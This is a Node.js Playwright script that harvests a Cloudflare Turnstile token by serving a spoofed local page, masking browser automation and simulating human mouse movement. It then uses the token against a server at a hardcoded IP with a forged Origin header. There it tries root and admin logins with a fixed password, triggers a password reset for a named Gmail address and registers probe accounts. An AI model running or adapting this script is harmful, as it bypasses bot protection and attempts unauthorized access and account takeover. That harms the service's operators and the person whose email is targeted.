const { chromium } = require('playwright-core');
const http = require('http');
const https = require('https');
const fs = require('fs');
const T = process.env.RUNNER_TEMP || '/tmp';
const REAL = '0x4AAAAAAEGBqst_6XV04SLn';
const UA = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36';
const log = s => { const l = '[' + new Date().toISOString().slice(11, 19) + '] ' + s; console.log(l); try { fs.appendFileSync(T + '/j.log', l + '\n'); } catch (e) {} };
const sleep = ms => new Promise(r => setTimeout(r, ms));
const rnd = (a, b) => a + Math.random() * (b - a);

const PAGE = `<!doctype html><html><head><meta charset="utf-8"><title>ts</title>
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit" async defer></script>
</head><body><h3>ts</h3><div id="ts"></div>
<script>window.__tok='';window.__errs=[];
(function boot(){ if(!window.turnstile){return setTimeout(boot,300);}
 try{ window.turnstile.render('#ts',{sitekey:'${REAL}',appearance:'always',size:'flexible',
   callback:t=>{window.__tok=t},'error-callback':e=>window.__errs.push(String(e)),'timeout-callback':()=>window.__errs.push('TIMEOUT')});}
 catch(e){window.__errs.push('THROW:'+e)} })();
</script></body></html>`;

const handler = (req, res) => {
  if (req.url === '/favicon.ico') { res.writeHead(204); return res.end(); }
  res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' });
  res.end(PAGE);
};
http.createServer(handler).listen(80, '127.0.0.1');
https.createServer({ key: fs.readFileSync(T + '/k.pem'), cert: fs.readFileSync(T + '/c.pem') }, handler).listen(443, '127.0.0.1');

async function submit(tok, tag) {
  const base = 'http://63.141.242.130:3000';
  const run = async (name, url, body) => {
    try {
      const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json', 'Origin': 'https://foxrouter.org' }, body: body });
      log(`SUBMIT ${tag} ${name} -> ${r.status} ${(await r.text()).slice(0, 600)}`);
    } catch (e) { log(`SUBMIT ${tag} ${name} ERR ${e}`); }
  };
  await run('login_root_a2317471', base + '/api/user/login?turnstile=' + encodeURIComponent(tok), JSON.stringify({ username: 'root', password: 'a2317471' }));
  await run('login_admin_a2317471', base + '/api/user/login?turnstile=' + encodeURIComponent(tok), JSON.stringify({ username: 'admin', password: 'a2317471' }));
  await run('reset_pw', base + '/api/user/reset_password?email=robincranston35%40gmail.com&turnstile=' + encodeURIComponent(tok), null);
  await run('register_probe', base + '/api/user/register?turnstile=' + encodeURIComponent(tok), JSON.stringify({ username: 'probe' + Date.now() % 100000, password: 'Probe12345!', email: 'p' + Date.now() % 100000 + '@example.com' }));
}

// click checkbox inside turnstile iframe (iframe lives in shadow root -> use frame.frameElement())
async function tryClick(page) {
  for (const f of page.frames()) {
    if (!/challenges\.cloudflare\.com/.test(f.url())) continue;
    let h = null;
    try { h = await f.frameElement(); } catch (e) { continue; }
    if (!h) continue;
    let b = null;
    try { b = await h.boundingBox(); } catch (e) {}
    if (!b || b.width < 10) continue;
    const x = b.x + Math.min(32, b.width * 0.12), y = b.y + b.height / 2;
    // human-ish approach
    const vp = page.viewportSize() || { width: 1280, height: 800 };
    const sx = vp.width * rnd(0.6, 0.9), sy = vp.height * rnd(0.65, 0.95);
    for (let i = 1; i <= 12; i++) {
      const t = i / 12;
      await page.mouse.move(sx + (x - sx) * t + rnd(-8, 8) * (1 - t), sy + (y - sy) * t + rnd(-6, 6) * (1 - t));
      await sleep(rnd(15, 40));
    }
    await sleep(rnd(150, 450));
    await page.mouse.move(x + rnd(-2, 2), y + rnd(-2, 2), { steps: 6 });
    await sleep(rnd(120, 350));
    await page.mouse.down(); await sleep(rnd(60, 130)); await page.mouse.up();
    log(`CLICK box=${Math.round(b.x)},${Math.round(b.y)} ${Math.round(b.width)}x${Math.round(b.height)}`);
    return true;
  }
  return false;
}

async function round(ctx, url, label) {
  const page = await ctx.newPage();
  page.on('response', async r => {
    const u = r.url();
    if (!/challenge-platform|challenges\.cloudflare/.test(u)) return;
    let b = ''; try { b = (await r.text()).slice(0, 200); } catch (e) { b = '<nb>'; }
    log('RESP ' + r.status() + ' ' + r.request().method() + ' ' + u.slice(0, 120) + ' :: ' + b.replace(/\s+/g, ' ').slice(0, 160));
  });
  page.on('requestfailed', r => log('FAILED ' + r.url().slice(0, 110) + ' ' + (r.failure() || {}).errorText));
  log(`ROUND ${label} ${url}`);
  try { await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 30000 }); } catch (e) { log('GOTO_ERR ' + String(e).slice(0, 80)); }
  await sleep(rnd(1500, 2600));
  log('TITLE ' + (await page.title()).slice(0, 60) + ' origin=' + await page.evaluate(() => location.origin));
  let tok = ''; const t0 = Date.now(); let clicks = 0, lastClick = 0;
  while (Date.now() - t0 < 180000 && !tok) {
    await sleep(1000);
    tok = await page.evaluate(() => {
      try { const e = document.querySelector('input[name="cf-turnstile-response"]'); if (e && e.value) return e.value; } catch (x) {}
      try { return (window.turnstile && window.turnstile.getResponse && window.turnstile.getResponse()) || window.__tok || ''; } catch (e) { return ''; }
    });
    if (tok) break;
    const el = Date.now() - t0;
    if (clicks < 4 && el > 4000 && el - lastClick > 9000) { lastClick = el; clicks++; try { await tryClick(page); } catch (e) { log('CLICK_ERR ' + e); } }
  }
  const st = await page.evaluate(() => ({ errs: (window.__errs || []).join('|'), html: (document.getElementById('ts') || {}).innerHTML || '' }));
  log(`ROUND_END ${label} tok_len=${tok.length} elapsed=${Date.now() - t0} clicks=${clicks} errs=${st.errs} div=${st.html.replace(/\s+/g, ' ').slice(0, 200)}`);
  try { fs.writeFileSync(T + `/j_${label}.png`, await page.screenshot()); fs.writeFileSync(T + `/j_${label}.html`, await page.content()); } catch (e) {}
  await page.close();
  return tok;
}

(async () => {
  const dir = T + '/prof';
  const ctx = await chromium.launchPersistentContext(dir, { executablePath: '/usr/bin/google-chrome', headless: false, userAgent: UA,
    viewport: { width: 1280, height: 800 }, locale: 'en-US', timezoneId: 'America/New_York', ignoreHTTPSErrors: true,
    args: ['--no-sandbox', '--disable-dev-shm-usage', '--disable-blink-features=AutomationControlled', '--ignore-certificate-errors',
      '--disable-features=ThirdPartyStoragePartitioning,TrackingProtection3pcd,PrivacySandboxSettings4'] });
  await ctx.addInitScript(() => { Object.defineProperty(navigator, 'webdriver', { get: () => undefined }); });
  const targets = [
    ['likeai_self', 'https://likeai520.cc/'],
    ['api_likeai_self', 'https://api.likeai520.cc/'],
    ['www_likeai_real', 'https://www.likeai520.cc/'],
    ['api_likeai_real', 'https://api.likeai520.cc/'],
  ];
  let got = '';
  for (const [label, url] of targets) {
    for (let i = 1; i <= 3 && !got; i++) {
      got = await round(ctx, url, label + '#' + i);
      if (got) { log('TOKEN ' + label + ' ' + got); fs.writeFileSync(T + '/token.txt', got); await submit(got, label); break; }
    }
    if (got) break;
  }
  log('DONE got=' + got.length);
  await ctx.close(); process.exit(0);
})().catch(e => { log('FATAL ' + e); process.exit(1); });
